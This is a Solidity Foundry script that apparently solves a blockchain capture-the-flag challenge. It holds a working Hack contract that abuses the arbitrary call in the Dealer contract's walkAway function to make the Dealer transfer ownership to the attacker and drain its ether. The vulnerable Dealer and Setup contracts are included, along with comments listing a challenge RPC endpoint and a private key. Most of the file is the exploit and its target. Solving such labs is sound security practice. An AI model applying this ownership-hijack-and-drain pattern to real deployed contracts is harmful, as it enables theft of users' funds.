// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0xBC51fc2aff9Bb0070829932DeF4c7C475b6b962d);
    address wallet = 0x480ef4E62e9aA55428f6B74cA99429093D3C6b92;
    Dealer public dealer = setup.dealer();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0x9ab6741ca988f20f7f798891ba0c3fa396763ee034b6d1855ae9810496876cab);

        console.log(wallet.balance);

        Hack hack = new Hack(payable(address(dealer)));
        hack.attack{value: 5 ether}();

        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}

// UUID	f063f782-d938-49f5-9535-7414385db0f1
// RPC Endpoint	http://103.178.153.113:40009/f063f782-d938-49f5-9535-7414385db0f1
// Private Key	0x9ab6741ca988f20f7f798891ba0c3fa396763ee034b6d1855ae9810496876cab
// Setup Contract	0xBC51fc2aff9Bb0070829932DeF4c7C475b6b962d
// Wallet	0x480ef4E62e9aA55428f6B74cA99429093D3C6b92

contract Hack {
    Dealer public dealer;

    constructor(address payable _target) {
        dealer = Dealer(_target);
    }

    function attack() external payable {
        dealer.joinGame{value: 5 ether}();
        dealer.bet(2 ether);

        bytes memory data = abi.encodeWithSignature("changeOwner(address)", address(this));
        dealer.walkAway(address(dealer), data);
        dealer.startRiggedBet();
        dealer.endWholeGame();

    }

    receive() external payable {}
}

contract Dealer{
    bool public readyToRig;
    address public owner;
    uint256 public rewardPool;
    mapping(address => uint256) public balanceOf;

    constructor() payable{
        owner = msg.sender;
    }

    function joinGame() public payable{
        require(msg.value >= 5 ether, "Must Deposit Minimum of 5 Ether!");
        balanceOf[msg.sender] += msg.value;
    }

    function bet(uint256 _amount) public{
        require(balanceOf[msg.sender] >= 5 ether, "Need 5 Ether to bet");
        require(_amount >= 2 ether, "Start with 2");
        rewardPool += balanceOf[owner];
        balanceOf[owner] = 0;
        rewardPool += _amount;
        balanceOf[msg.sender] -= _amount;
        readyToRig = true;
    }

    function startRiggedBet() public onlyOwner{
        require(readyToRig == true, "Pool is not filled!");
        balanceOf[owner] += rewardPool;
        rewardPool = 0;
        readyToRig = false;
    }

    function endWholeGame() public onlyOwner{
        uint256 toSend = balanceOf[owner];
        (bool sent, ) = owner.call{value: toSend}("");
        require(sent, "Ending Game Failed!");
    }

    function walkAway(address _to, bytes memory message) public {
        require(readyToRig == true, "You want to wal away empty handed?");
        uint256 leftAmount = balanceOf[msg.sender];
        balanceOf[msg.sender] -= leftAmount;
        (bool sent, ) = _to.call{value: leftAmount}(message);
        require(sent, "You can't run it seems.");
    }

    function changeOwner(address _newOwner) public payable{
        require(msg.sender == address(this), "Only Dealer can change owner");
        owner = _newOwner;
        balanceOf[owner] += msg.value;
    }

    modifier onlyOwner(){
        require(msg.sender == owner, "Only Owner can start bet!");
        _;
    }

    receive() external payable {
        if(msg.value == 5 ether){
            balanceOf[msg.sender] += msg.value;
        }else{
            rewardPool += msg.value;
        }
    }
}

contract Setup{
    Dealer public dealer;

    constructor() payable{
        dealer = new Dealer();
        dealer.joinGame{value: 50 ether}();
    }

    function isSolved() public view returns(bool){
        return address(dealer).balance == 0 && dealer.owner() != address(this);
    }

}